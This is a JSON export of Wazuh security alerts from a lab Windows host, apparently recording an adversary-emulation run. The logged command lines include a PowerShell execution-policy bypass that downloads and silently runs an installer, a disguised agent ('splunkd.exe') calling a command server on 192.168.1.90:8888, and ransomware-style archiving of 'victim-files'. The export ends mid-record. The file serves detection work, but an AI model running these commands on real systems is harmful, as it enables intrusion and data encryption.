[ 
 {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "YEfdOZkBIDwfn7_zzKqj",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "subjectLogonId": "0x3e7",
            "subjectDomainName": "WORKGROUP",
            "targetLinkedLogonId": "0x0",
            "impersonationLevel": "%%1833",
            "authenticationPackageName": "Negotiate",
            "targetLogonId": "0x3e7",
            "logonProcessName": "Advapi",
            "logonGuid": "{00000000-0000-0000-0000-000000000000}",
            "targetUserName": "SYSTEM",
            "keyLength": "0",
            "elevatedToken": "%%1842",
            "subjectUserSid": "S-1-5-18",
            "processId": "0x2dc",
            "processName": "C:\\\\Windows\\\\System32\\\\services.exe",
            "targetDomainName": "NT AUTHORITY",
            "targetUserSid": "S-1-5-18",
            "virtualAccount": "%%1843",
            "logonType": "5",
            "subjectUserName": "DESKTOP-MDNNEJF$"
          },
          "system": {
            "eventID": "4624",
            "keywords": "0x8020000000000000",
            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
            "level": "0",
            "channel": "Security",
            "opcode": "0",
            "message": "\"L'ouverture de session d'un compte s'est correctement déroulée.\r\n\r\nObjet :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tDESKTOP-MDNNEJF$\r\n\tDomaine du compte :\t\tWORKGROUP\r\n\tID d'ouverture de session :\t\t0x3E7\r\n\r\nInformations d'ouverture de session :\r\n\tType d'ouverture de session :\t\t5\r\n\tMode administrateur restreint :\t-\r\n\tCredential Guard à distance :\t-\r\n\tCompte virtuel :\t\tNon\r\n\tJeton élevé :\t\tOui\r\n\r\nNiveau d'emprunt d'identité :\t\tEmprunt d’identité\r\n\r\nNouvelle ouverture de session :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tSYSTEM\r\n\tDomaine du compte :\t\tNT AUTHORITY\r\n\tID d'ouverture de session :\t\t0x3E7\r\n\tID d'ouverture de session liée :\t\t0x0\r\n\tNom du compte réseau :\t-\r\n\tDomaine du compte réseau :\t-\r\n\tGUID d'ouverture de session :\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nInformations sur le processus :\r\n\tID du processus :\t\t0x2dc\r\n\tNom du processus :\t\tC:\\Windows\\System32\\services.exe\r\n\r\nInformations sur le réseau :\r\n\tNom de la station de travail :\t-\r\n\tAdresse du réseau source :\t-\r\n\tPort source :\t\t-\r\n\r\nInformations détaillées sur l'authentification :\r\n\tProcessus d'ouverture de session :\t\tAdvapi  \r\n\tPackage d'authentification :\tNegotiate\r\n\tServices en transit :\t-\r\n\tNom du package (NTLM uniquement) :\t-\r\n\tLongueur de la clé :\t\t0\r\n\r\nCet événement est généré lors de la création d'une ouverture de session. Il est généré sur l'ordinateur sur lequel l'ouverture de session a été effectuée.\r\n\r\nLe champ Objet indique le compte sur le système local qui a demandé l'ouverture de session. Il s'agit le plus souvent d'un service, comme le service Serveur, ou un processus local tel que Winlogon.exe ou Services.exe.\r\n\r\nLe champ Type d'ouverture de session indique le type d'ouverture de session qui s'est produit. Les types les plus courants sont 2 (interactif) et 3 (réseau).\r\n\r\nLe champ Nouvelle ouverture de session indique le compte pour lequel la nouvelle ouverture de session a été créée, par exemple, le compte qui s'est connecté.\r\n\r\nLes champs relatifs au réseau indiquent la provenance d'une demande d'ouverture de session à distance. Le nom de la station de travail n'étant pas toujours disponible, peut être laissé vide dans certains cas.\r\n\r\nLe champ du niveau d'emprunt d'identité indique la portée de l'emprunt d'identité que peut prendre un processus dans la session d'ouverture de session.\r\n\r\nLes champs relatifs aux informations d'authentification fournissent des détails sur cette demande d'ouverture de session spécifique.\r\n\t- Le GUID d'ouverture de session est un identificateur unique pouvant servir à associer cet événement à un événement KDC .\r\n\t- Les services en transit indiquent les services intermédiaires qui ont participé à cette demande d'ouverture de session.\r\n\t- Nom du package indique quel est le sous-protocole qui a été utilisé parmi les protocoles NTLM.\r\n\t- La longueur de la clé indique la longueur de la clé de session générée. Elle a la valeur 0 si aucune clé de session n'a été demandée.\"",
            "version": "3",
            "systemTime": "2025-09-11T17:40:52.7326338Z",
            "eventRecordID": "19804",
            "threadID": "804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "12544",
            "processID": "756",
            "severityValue": "AUDIT_SUCCESS",
            "providerName": "Microsoft-Windows-Security-Auditing"
          }
        }
      },
      "rule": {
        "mail": false,
        "level": 3,
        "pci_dss": [
          "10.2.5"
        ],
        "hipaa": [
          "164.312.b"
        ],
        "tsc": [
          "CC6.8",
          "CC7.2",
          "CC7.3"
        ],
        "description": "Windows Logon Success",
        "groups": [
          "windows",
          "windows_security",
          "authentication_success"
        ],
        "nist_800_53": [
          "AU.14",
          "AC.9"
        ],
        "gdpr": [
          "IV_32.2"
        ],
        "firedtimes": 7,
        "mitre": {
          "technique": [
            "Valid Accounts"
          ],
          "id": [
            "T1078"
          ],
          "tactic": [
            "Defense Evasion",
            "Persistence",
            "Privilege Escalation",
            "Initial Access"
          ]
        },
        "id": "60106",
        "gpg13": [
          "7.1",
          "7.2"
        ]
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757612453.1671822",
      "timestamp": "2025-09-11T17:40:53.108+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:40:53.108Z"
      ]
    },
    "sort": [
      1757612453108
    ]
  },



  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "XEfYOZkBIDwfn7_zl6pB",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "Cmd.Exe",
            "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-082f-68c3-bd27-000000000e00}",
            "description": "Windows Command Processor",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"if (test-path 'C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe') { ; } else {Set-Content -Path \\\\\\\"$env:temp\\\\test.txt\\\\\\\" -Value \\\\\\\"populating this file with some text\\\\\\\"; New-Item -Type Directory \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\\\\\\\\\\\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \\\\\\\"https://files.gpg4win.org/gpg4win-4.1.0.exe\\\\\\\" -outfile \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe\\\\\\\"; cmd /c \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe\\\\\\\" /S};  ;  Set-Content -Path \\\\\\\"$env:temp\\\\test.txt\\\\\\\" -Value \\\\\\\"populating this file with some text\\\\\\\"; cmd /c \\\\\\\"`\\\\\\\"C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe`\\\\\\\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\\\\\\\"$env:temp\\\\test.txt`\\\\\\\"\\\\\\\"\\\"",
            "processGuid": "{994437b3-0855-68c3-c027-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "1404",
            "processId": "3032",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:35:17.633",
            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "company": "Microsoft Corporation",
            "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c \\\"\\\"C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe\\\" --passphrase 'SomeParaphraseBlah' --batch --yes -c \\\"C:\\\\Users\\\\ENV-AD~1\\\\AppData\\\\Local\\\\Temp\\\\test.txt\\\"\\\"",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:35:17.633\r\nProcessGuid: {994437b3-0855-68c3-c027-000000000e00}\r\nProcessId: 3032\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe\" --passphrase 'SomeParaphraseBlah' --batch --yes -c \"C:\\Users\\ENV-AD~1\\AppData\\Local\\Temp\\test.txt\"\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-082f-68c3-bd27-000000000e00}\r\nParentProcessId: 1404\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"if (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe') { ; } else {Set-Content -Path \\\"$env:temp\\test.txt\\\" -Value \\\"populating this file with some text\\\"; New-Item -Type Directory \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\\\\\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \\\"https://files.gpg4win.org/gpg4win-4.1.0.exe\\\" -outfile \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\\\"; cmd /c \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\\\" /S};  ;  Set-Content -Path \\\"$env:temp\\test.txt\\\" -Value \\\"populating this file with some text\\\"; cmd /c \\\"`\\\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\\\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\\\"$env:temp\\test.txt`\\\"\\\"\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:35:17.6360477Z",
            "eventRecordID": "9949",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 4,
        "mail": false,
        "level": 4,
        "description": "Powershell process spawned Windows command shell instance",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Windows Command Shell"
          ],
          "id": [
            "T1059.003"
          ],
          "tactic": [
            "Execution"
          ]
        },
        "id": "92004"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757612118.1653432",
      "timestamp": "2025-09-11T17:35:18.227+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:35:18.227Z"
      ]
    },
    "sort": [
      1757612118227
    ]
  },

  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "gkfvOZkBIDwfn7_zFKos",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "param3": "Démarrage automatique",
            "param4": "BITS",
            "param1": "Service de transfert intelligent en arrière-plan",
            "param2": "Démarrage à la demande"
          },
          "system": {
            "eventID": "7040",
            "eventSourceName": "Service Control Manager",
            "keywords": "0x8080000000000000",
            "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
            "level": "4",
            "channel": "System",
            "opcode": "0",
            "message": "\"Le type de démarrage du service Service de transfert intelligent en arrière-plan est passé de Démarrage à la demande à Démarrage automatique.\"",
            "version": "0",
            "systemTime": "2025-09-11T17:59:50.5521426Z",
            "eventRecordID": "15080",
            "threadID": "10928",
            "computer": "DESKTOP-MDNNEJF",
            "task": "0",
            "processID": "732",
            "severityValue": "INFORMATION",
            "providerName": "Service Control Manager"
          }
        }
      },
      "rule": {
        "firedtimes": 3,
        "mail": false,
        "level": 3,
        "pci_dss": [
          "10.6"
        ],
        "hipaa": [
          "164.312.b"
        ],
        "tsc": [
          "CC6.1",
          "CC6.8",
          "CC7.2",
          "CC7.3"
        ],
        "description": "Service startup type was changed",
        "groups": [
          "windows",
          "windows_system",
          "policy_changed"
        ],
        "id": "61104",
        "nist_800_53": [
          "AU.6"
        ],
        "info": "This does not appear to be logged on Windows 2000",
        "gdpr": [
          "IV_35.7.d"
        ]
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757613591.1821187",
      "timestamp": "2025-09-11T17:59:51.587+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:59:51.587Z"
      ]
    },
    "sort": [
      1757613591587
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "gEfvOZkBIDwfn7_zCKpx",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "data": "2025-09-12T15:50:43Z, RulesEngine"
          },
          "system": {
            "eventID": "16384",
            "eventSourceName": "Software Protection Platform Service",
            "keywords": "0x80000000000000",
            "providerGuid": "{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}",
            "level": "4",
            "channel": "Application",
            "opcode": "0",
            "message": "\"La planification du redémarrage du service de protection logicielle à 2025-09-12T15:50:43Z a réussi. Raison : RulesEngine.\"",
            "version": "0",
            "systemTime": "2025-09-11T17:59:43.2729111Z",
            "eventRecordID": "7256",
            "threadID": "0",
            "computer": "DESKTOP-MDNNEJF",
            "task": "0",
            "processID": "8456",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Security-SPP"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "Software protection service scheduled successfully.",
        "groups": [
          "windows",
          "windows_application"
        ],
        "id": "60642"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757613583.1810657",
      "timestamp": "2025-09-11T17:59:43.301+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:59:43.301Z"
      ]
    },
    "sort": [
      1757613583301
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "W0fYOZkBIDwfn7_zl6pB",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "image": "C:\\\\Windows\\\\System32\\\\ExternalPayloads\\\\gpginstall.exe",
            "product": "Gpg4win (4.1.0)",
            "parentProcessGuid": "{994437b3-0855-68c3-be27-000000000e00}",
            "description": "Gpg4win: The GNU Privacy Guard and Tools for Windows",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe /S",
            "processGuid": "{994437b3-0855-68c3-bf27-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "10348",
            "processId": "7196",
            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
            "utcTime": "2025-09-11 17:35:17.169",
            "hashes": "MD5=AF7406E869659C6A02D9281B0E2B9260,SHA256=E0FDDC840808EEF9531F14A515F8B3B6C46511977F00569161129C1DEE413B38,IMPHASH=EB0806DAE800674E97000F10E2EC3AA2",
            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "company": "Intevation GmbH",
            "commandLine": "PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe  /S",
            "integrityLevel": "High",
            "fileVersion": "4.1.0.59752",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:35:17.169\r\nProcessGuid: {994437b3-0855-68c3-bf27-000000000e00}\r\nProcessId: 7196\r\nImage: C:\\Windows\\System32\\ExternalPayloads\\gpginstall.exe\r\nFileVersion: 4.1.0.59752\r\nDescription: Gpg4win: The GNU Privacy Guard and Tools for Windows\r\nProduct: Gpg4win (4.1.0)\r\nCompany: Intevation GmbH\r\nOriginalFileName: -\r\nCommandLine: PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe  /S\r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=AF7406E869659C6A02D9281B0E2B9260,SHA256=E0FDDC840808EEF9531F14A515F8B3B6C46511977F00569161129C1DEE413B38,IMPHASH=EB0806DAE800674E97000F10E2EC3AA2\r\nParentProcessGuid: {994437b3-0855-68c3-be27-000000000e00}\r\nParentProcessId: 10348\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe /S\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:35:17.3773971Z",
            "eventRecordID": "9948",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 15,
        "mail": false,
        "level": 3,
        "description": "Suspicious Windows cmd shell execution",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Account Discovery",
            "Windows Command Shell"
          ],
          "id": [
            "T1087",
            "T1059.003"
          ],
          "tactic": [
            "Discovery",
            "Execution"
          ]
        },
        "id": "92032"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757612118.1647649",
      "timestamp": "2025-09-11T17:35:18.221+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:35:18.221Z"
      ]
    },
    "sort": [
      1757612118221
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "V0fYOZkBIDwfn7_zDqpr",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "processGuid": "{994437b3-082f-68c3-bd27-000000000e00}",
            "processId": "1404",
            "utcTime": "2025-09-11 17:34:40.461",
            "targetFilename": "C:\\\\Windows\\\\System32\\\\ExternalPayloads\\\\gpginstall.exe",
            "ruleName": "EXE",
            "creationUtcTime": "2025-09-11 17:34:40.461",
            "user": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "11",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"File created:\r\nRuleName: EXE\r\nUtcTime: 2025-09-11 17:34:40.461\r\nProcessGuid: {994437b3-082f-68c3-bd27-000000000e00}\r\nProcessId: 1404\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Windows\\System32\\ExternalPayloads\\gpginstall.exe\r\nCreationUtcTime: 2025-09-11 17:34:40.461\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "2",
            "systemTime": "2025-09-11T17:34:40.4649159Z",
            "eventRecordID": "9944",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "11",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 9,
        "description": "Powershell process created an executable file in Windows root folder",
        "groups": [
          "sysmon",
          "sysmon_eid11_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Ingress Tool Transfer"
          ],
          "id": [
            "T1105"
          ],
          "tactic": [
            "Command and Control"
          ]
        },
        "id": "92205"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757612081.1635793",
      "timestamp": "2025-09-11T17:34:41.511+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:34:41.511Z"
      ]
    },
    "sort": [
      1757612081511
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "VkfYOZkBIDwfn7_zDqpr",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "processGuid": "{994437b3-082f-68c3-bd27-000000000e00}",
            "processId": "1404",
            "utcTime": "2025-09-11 17:34:39.197",
            "targetFilename": "C:\\\\Users\\\\env-admin\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_a2rusfem.lly.ps1",
            "creationUtcTime": "2025-09-11 17:34:39.197",
            "user": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "11",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:34:39.197\r\nProcessGuid: {994437b3-082f-68c3-bd27-000000000e00}\r\nProcessId: 1404\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\env-admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_a2rusfem.lly.ps1\r\nCreationUtcTime: 2025-09-11 17:34:39.197\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "2",
            "systemTime": "2025-09-11T17:34:39.2097865Z",
            "eventRecordID": "9943",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "11",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 41,
        "mail": true,
        "level": 15,
        "description": "Executable file dropped in folder commonly used by malware",
        "groups": [
          "sysmon",
          "sysmon_eid11_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Ingress Tool Transfer"
          ],
          "id": [
            "T1105"
          ],
          "tactic": [
            "Command and Control"
          ]
        },
        "id": "92213"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757612080.1632975",
      "timestamp": "2025-09-11T17:34:40.176+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:34:40.176Z"
      ]
    },
    "sort": [
      1757612080176
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "VUfXOZkBIDwfn7_zX6pa",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "Cmd.Exe",
            "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-f6cf-68c2-1627-000000000e00}",
            "description": "Windows Command Processor",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://192.168.1.90:8888 -group red",
            "processGuid": "{994437b3-0800-68c3-bc27-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "10580",
            "processId": "10384",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:33:52.617",
            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
            "parentImage": "C:\\\\Users\\\\Public\\\\splunkd.exe",
            "company": "Microsoft Corporation",
            "commandLine": "cmd.exe /C path=%%path%%;\\\"C:\\\\Program Files (x86)\\\\winzip\\\" &amp;&amp; mkdir .\\\\tmp\\\\victim-files &amp;&amp; cd .\\\\tmp\\\\victim-files &amp;&amp; echo \\\"This file will be encrypted\\\" &gt; .\\\\encrypted_file.txt &amp;&amp; \\\"%%ProgramFiles%%\\\\WinZip\\\\winzip64.exe\\\" -min -a -s\\\"hello\\\" archive.zip * &amp;&amp; dir",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:33:52.617\r\nProcessGuid: {994437b3-0800-68c3-bc27-000000000e00}\r\nProcessId: 10384\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe /C path=%%path%%;\"C:\\Program Files (x86)\\winzip\" && mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%%ProgramFiles%%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip * && dir\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-f6cf-68c2-1627-000000000e00}\r\nParentProcessId: 10580\r\nParentImage: C:\\Users\\Public\\splunkd.exe\r\nParentCommandLine: \"C:\\Users\\Public\\splunkd.exe\" -server http://192.168.1.90:8888 -group red \r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:33:52.6224693Z",
            "eventRecordID": "9941",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 22,
        "mail": false,
        "level": 4,
        "description": "Windows command prompt started by an abnormal process",
        "groups": [
          "sysmon",
